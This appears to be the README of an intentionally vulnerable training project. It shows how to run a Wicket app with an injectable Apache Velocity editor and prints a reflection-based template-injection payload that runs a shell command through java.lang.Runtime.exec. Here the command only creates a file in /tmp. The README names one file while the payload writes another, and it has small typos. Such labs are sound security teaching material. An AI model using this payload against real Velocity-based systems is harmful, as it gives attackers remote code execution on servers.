# vuln-velocity #

What is Apache Velocity?
Velocity is a Java-based template engine. It permits anyone to use a simple yet powerful template language to reference objects defined in Java code.

Apache velocity can be used or configured wrong. Attacker can execute arbitrary code using apache velocity.

## vuln velocity project: ##

1. vuln-velocity-wicket
2. vuln-velocity-liferay

## vuln-velocity-wicket ##

You can start vulnerable wicket project on cli:

```
cd cd vuln-velocity-wicket
mvn clean install 
java -jar target/dependency/jetty-runner.jar target/*.war
```

1. Visit local URL http://127.0.0.1:8080/
2. Paste velocity exploit code into wicket veloctiy editor.
3. Press update button.
4. Velocity expoit creates a new file velocity-poc.txt in /tmp

```
#set($start = "")
#set($classLoaderMethod =$start.getClass().getClass().getDeclaredMethod("getClassLoader", null))
$classLoaderMethod.setAccessible(true)
#set($appClassLoader=$classLoaderMethod.invoke(${persons.get(0).getClass()},null))


#set($runtTimeClass = $appClassLoader.loadClass("java.lang.Runtime"))
#set($runtimedMethod = $runtTimeClass.getDeclaredMethod("getRuntime", null))
#set($runtimedMethodExecuted = $runtimedMethod.invoke($runtTimeClass, null))
#set($stringClass = $appClassLoader.loadClass("java.lang.String"))
$runtimedMethodExecuted.getClass().getDeclaredMethod("exec", $stringClass).invoke($runtimedMethodExecuted, "touch /tmp/velocity-rce-poc.txt")
```

## vuln-velocity-lifery ##

Coming soon
